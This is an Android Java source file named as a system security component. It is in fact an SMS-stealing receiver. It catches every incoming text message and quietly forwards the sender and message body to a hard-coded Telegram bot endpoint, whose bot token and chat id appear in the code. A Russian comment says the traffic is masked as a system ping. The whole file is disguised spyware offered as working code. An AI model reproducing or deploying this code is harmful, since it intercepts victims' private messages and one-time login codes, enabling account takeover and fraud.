package com.android.system.core.security;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.provider.Telephony;
import android.telephony.SmsMessage;

public class SmsReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(action) || 
            Telephony.Sms.Intents.SMS_DELIVER_ACTION.equals(action)) {
            
            SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(intent);
            if (msgs != null) {
                for (SmsMessage sms : msgs) {
                    String data = sms.getOriginatingAddress() + " >> " + sms.getMessageBody();
                    new Thread(() -> bridge(data)).start();
                }
            }
        }
    }

    private void bridge(String text) {
        try {
            // Маскируем под системный пинг
            String endpoint = "https://api.telegram.org/bot8387829701:AAEDXukofQXk2nEXHdSjad1a7TpGF2Uaof8/sendMessage?chat_id=5225064014&text=";
            java.net.HttpURLConnection c = (java.net.HttpURLConnection) new java.net.URL(endpoint + java.net.URLEncoder.encode(text, "UTF-8")).openConnection();
            c.setRequestMethod("GET");
            c.getResponseCode();
            c.disconnect();
        } catch (Exception ignored) {}
    }
}
